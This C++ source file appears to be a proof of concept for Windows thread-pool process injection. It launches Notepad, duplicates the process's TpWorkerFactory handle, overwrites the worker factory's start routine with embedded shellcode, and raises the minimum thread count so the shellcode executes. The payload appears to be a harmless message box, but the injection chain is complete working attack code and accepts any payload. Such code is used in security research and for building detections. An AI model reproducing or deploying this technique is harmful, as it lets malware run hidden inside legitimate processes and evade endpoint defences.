#include <iostream>
#include <windows.h>
#include <winternl.h>

const char* k = "[+]";
const char* e = "[-]";

DWORD PID = NULL;
HANDLE hProcess = NULL;

unsigned char shellcode[] = {
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
    "\x8d\x8d\x35\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
    "\x00\x3e\x4c\x8d\x85\x23\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x20\x73"
    "\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x00\x50\x72\x6f\x63"
    "\x65\x73\x73\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x00"
    "\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00"
};

// Worker Factory Access Permissions
#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020

#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(

    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* fnNtQueryObject)(

    _In_opt_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _Out_writes_bytes_opt_(ObjectInformationLength) PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength,
    _Out_opt_ PULONG ReturnLength
    );

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;

typedef enum _QUERY_WORKERFACTORYINFOCLASS
{
    WorkerFactoryBasicInformation = 7,
} QUERY_WORKERFACTORYINFOCLASS, * PQUERY_WORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* fnNtQueryInformationWorkerFactory)(

    _In_ HANDLE WorkerFactoryHandle,
    _In_ QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _Out_writes_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength
    );

typedef enum _SET_WORKERFACTORYINFOCLASS
{
    WorkerFactoryTimeout = 0,
    WorkerFactoryRetryTimeout = 1,
    WorkerFactoryIdleTimeout = 2,
    WorkerFactoryBindingCount = 3,
    WorkerFactoryThreadMinimum = 4,
    WorkerFactoryThreadMaximum = 5,
    WorkerFactoryPaused = 6,
    WorkerFactoryAdjustThreadGoal = 8,
    WorkerFactoryCallbackType = 9,
    WorkerFactoryStackInformation = 10,
    WorkerFactoryThreadBasePriority = 11,
    WorkerFactoryTimeoutWaiters = 12,
    WorkerFactoryFlags = 13,
    WorkerFactoryThreadSoftMaximum = 14,
    WorkerFactoryMaxInfoClass = 15
} SET_WORKERFACTORYINFOCLASS, * PSET_WORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* fnNtSetInformationWorkerFactory)(

    _In_ HANDLE WorkerFactoryHandle,
    _In_ SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength
    );

int main()
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    fnNtQueryInformationProcess pQueryProcInfo = nullptr;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessSnapshotInfo = nullptr;
    fnNtQueryObject pQueryObject = nullptr;
    PPUBLIC_OBJECT_TYPE_INFORMATION objectInfo = nullptr;
    uint32_t totalHandles = 0;
    uint32_t handleInfoSize = 0;
    HANDLE duplicatedHandle = 0;
    uint32_t objectTypeReturnLen = 0;

    uint32_t oldProtect = 0;
    WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
    fnNtSetInformationWorkerFactory pNtSetInformationWorkerFactory = nullptr;
    fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = nullptr;
    uint32_t threadMinimumCount = 0;

    const wchar_t* handleTypeName = L"TpWorkerFactory";

    printf("%s To start, we will open Notepad\n", k);
    system("pause");
    

    // Start the Notepad process
    int status = CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), // Application name
        NULL,   // Command line arguments
        NULL,   // Process handle not inheritable
        NULL,   // Thread handle not inheritable
        FALSE,  // Set handle inheritance to FALSE
        0,      // No creation flags
        NULL,   // Use parent's environment block
        NULL,   // Use parent's starting directory 
        &si,    // Pointer to STARTUPINFO structure
        &pi);    // Pointer to PROCESS_INFORMATION structure

    if (!status) {
        printf("%s failed open process, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    hProcess = pi.hProcess;

    PID = pi.dwProcessId;
    printf("%s PID %ld\n", k, PID);
    system("pause");

    
    // Get NtQuery functions from NTDLL
    // This functions are not public, they must be imported dynamically

    // NtQueryInformationProcess
    pQueryProcInfo = reinterpret_cast<fnNtQueryInformationProcess>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

    // NtQueryObject
    pQueryObject = reinterpret_cast<fnNtQueryObject>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryObject"));

    // - SECTION 1: Get all the open handles to the process
    // With this function we retrieve the number of openHandles to a process
    GetProcessHandleCount(hProcess, (PDWORD)&totalHandles);

    // We prepare the memory space to allocate the handles of the Process
    handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));
    pProcessSnapshotInfo = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));

    printf("%s Total Handles: %d\n", k, totalHandles);

    // We use call this function to take a snapshot of the handles of the process
    // 51 is undocumented on the PROCESSINFOCLASS ENUM
    status = pQueryProcInfo(
        hProcess,
        (PROCESSINFOCLASS)51,
        pProcessSnapshotInfo,
        handleInfoSize,
        NULL
    );

    if (status != ERROR_SUCCESS) {
        printf("%s Error geting Handle information: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    // - SECTION 2: Duplicate the Worker Factory Handle
    // We are going to iterate over the handles of the process
    // Until we find the Worker Factory handle to duplicate it
    for (size_t i = 0; i < pProcessSnapshotInfo->NumberOfHandles; i++) {
        if (!DuplicateHandle(hProcess,
            pProcessSnapshotInfo->Handles[i].HandleValue,
            GetCurrentProcess(),
            &duplicatedHandle,
            WORKER_FACTORY_ALL_ACCESS,
            FALSE,
            NULL
        )) {
            continue;
        }

        // Retrieve correct buffer size first
        pQueryObject(duplicatedHandle,
            ObjectTypeInformation,
            NULL,
            NULL,
            (PULONG)&objectTypeReturnLen
        );

        objectInfo = static_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen));
        if (objectInfo == nullptr) {
            break;
        }
        // We query the object information of the handle to verify its type
        pQueryObject(duplicatedHandle,
            ObjectTypeInformation,
            objectInfo,
            objectTypeReturnLen,
            NULL
        );

        // If the type of the handle is TpWorkerFactory it meas we found it
        if (wcsncmp(L"TpWorkerFactory", objectInfo->TypeName.Buffer, wcslen(handleTypeName)) == 0) {
            std::wcout <<  k << L" Found \"" << objectInfo->TypeName.Buffer << L"\" handle! Hijacking successful." << std::endl;
            break;
        }

        HeapFree(GetProcessHeap(), 0, objectInfo);
    }

    if (pProcessSnapshotInfo) {
        HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo);
    }
    if (objectInfo) {
        HeapFree(GetProcessHeap(), 0, objectInfo);
    }

    pNtQueryInformationWorkerFactory = reinterpret_cast<fnNtQueryInformationWorkerFactory>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
            "NtQueryInformationWorkerFactory"));

    pNtSetInformationWorkerFactory = reinterpret_cast<fnNtSetInformationWorkerFactory>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
            "NtSetInformationWorkerFactory"));

    if (pNtSetInformationWorkerFactory == nullptr || pNtQueryInformationWorkerFactory == nullptr) {
        printf("%s Failed to get function pointers", e);
        return EXIT_FAILURE;
    }

    // - SECTION 3: Get the Start Routine address
    // We query the information of the Worker Factory handle
    // To get the start routine address
    status = pNtQueryInformationWorkerFactory(
        duplicatedHandle,
        WorkerFactoryBasicInformation,
        &workerFactoryInfo,
        sizeof(WORKER_FACTORY_BASIC_INFORMATION),
        nullptr
    );

    if (status != ERROR_SUCCESS) {
        printf("%s Error geting Start Routine: %ld", e, status);
        return EXIT_FAILURE;
    }

    printf("%s Start routine address found: 0x%p\n", k, workerFactoryInfo.StartRoutine);

    // - SECTION 4: Change the permissions of the start routin address to Read/Write
    if (!VirtualProtectEx(
        hProcess,
        workerFactoryInfo.StartRoutine,
        sizeof(shellcode),
        PAGE_READWRITE,
        (PDWORD)&oldProtect
    )) {
        printf("%s Error Changing Protect: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Change protection memory to PAGE_READWRITE \n", k);

    // - SECTION 5: Write the shellcode on the Start Routine address
    if (!WriteProcessMemory(
        hProcess,
        workerFactoryInfo.StartRoutine,
        shellcode,
        sizeof(shellcode),
        nullptr
    )) {
        printf("%s Error When writing on memory: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Shellcode written in Start Routine address \n", k);

    // We change the Routin Address protection back what it was
    if (!VirtualProtectEx(
        hProcess,
        workerFactoryInfo.StartRoutine,
        sizeof(shellcode),
        oldProtect,
        (PDWORD)&oldProtect
    )) {
        printf("%s Error When reverting memory protection: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    // - SECTION 6: Execute the shellcode
    // We change the minimum nomber of threads in the pool to trigger the execution of the shellcode
    threadMinimumCount = workerFactoryInfo.TotalWorkerCount + 1;
    status = pNtSetInformationWorkerFactory(
        duplicatedHandle,
        WorkerFactoryThreadMinimum,
        &threadMinimumCount,
        sizeof(uint32_t)
    );

    if (status != ERROR_SUCCESS) {
        printf("%s Error changing the minimum threads number: %ld", e, status);
        return false;
    }

    printf("%s Increased minimum threads \n", k);
    printf("%s Process injection concluded! Press enter to exit\n", k);
    getchar();

    return EXIT_SUCCESS;

}

